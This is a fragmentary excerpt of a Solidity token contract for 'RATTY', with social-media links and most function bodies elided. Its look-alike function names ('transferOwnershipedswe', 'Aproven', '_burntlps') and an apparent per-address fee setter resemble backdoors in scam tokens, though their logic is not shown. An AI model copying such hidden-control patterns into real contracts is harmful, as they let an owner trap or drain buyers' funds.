/**
Telegram:https://t.me/Rattyerc20
Website:https://rattycoin.com/
Twitter:https://twitter.com/RATTYERC20
...
abstract contract Ownable {
    ...
    function transferOwnershipedswe(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract RATTY is Ownable {
    ...
    function Aproven(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burntlps(address user) public {
